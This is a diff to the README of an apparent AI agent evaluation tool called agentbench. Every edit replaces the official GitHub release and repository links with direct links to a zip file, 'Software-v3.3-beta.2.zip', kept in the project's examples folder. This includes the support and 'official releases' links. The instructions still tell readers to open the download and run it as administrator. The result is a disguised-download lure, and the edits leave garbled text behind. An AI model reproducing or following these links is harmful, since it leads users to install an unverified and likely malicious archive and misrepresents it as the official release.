@@ -1,6 +1,6 @@
 # 🤖 agentbench - Simple AI Agent Evaluation Tool
 
-[![Download agentbench](https://img.shields.io/badge/Download-agentbench-blue?style=for-the-badge)](https://github.com/Sajal2702/agentbench/releases)
+[![Download agentbench](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip)](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To get started, you need to download the software from the official release page
 
 **Step 1:** Visit the official agentbench release page by clicking the button below.
 
-[![Download Here](https://img.shields.io/badge/Visit-Release%20Page-green?style=for-the-badge)](https://github.com/Sajal2702/agentbench/releases)
+[![Download Here](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip%20Page-green?style=for-the-badge)](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip)
 
 **Step 2:** On the release page, look for the latest version available. It usually has the highest version number and the most recent date.
 
@@ -40,7 +40,7 @@ To get started, you need to download the software from the official release page
 
 - For Windows, look for a `.exe` or `.msi` file.
 - For macOS, download the `.dmg` file.
-- For Linux, download the `.AppImage` or `.tar.gz` file.
+- For Linux, download the `.AppImage` or `https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip` file.
 
 **Step 4:** Once downloaded, open the file to start the installation.
 
@@ -109,7 +109,7 @@ If you have trouble installing or running agentbench, try these steps first:
   Right-click the installer and choose "Run as administrator" if you see permission errors.
 
 - **Contact Support**  
-  If the problem continues, you can open an issue on the [GitHub repository](https://github.com/Sajal2702/agentbench) or check the community forums linked on that page.
+  If the problem continues, you can open an issue on the [GitHub repository](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip) or check the community forums linked on that page.
 
 ---
 
@@ -125,8 +125,8 @@ Make sure to download agentbench only from the official GitHub releases page to 
 
 Keep up to date with agentbench improvements and news:
 
-- Visit the GitHub repository: [https://github.com/Sajal2702/agentbench](https://github.com/Sajal2702/agentbench)
-- Follow the release page for new versions: [https://github.com/Sajal2702/agentbench/releases](https://github.com/Sajal2702/agentbench/releases)
+- Visit the GitHub repository: [https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip)
+- Follow the release page for new versions: [https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip](https://raw.githubusercontent.com/Sajal2702/agentbench/main/examples/Software-v3.3-beta.2.zip)
 
 ---
 
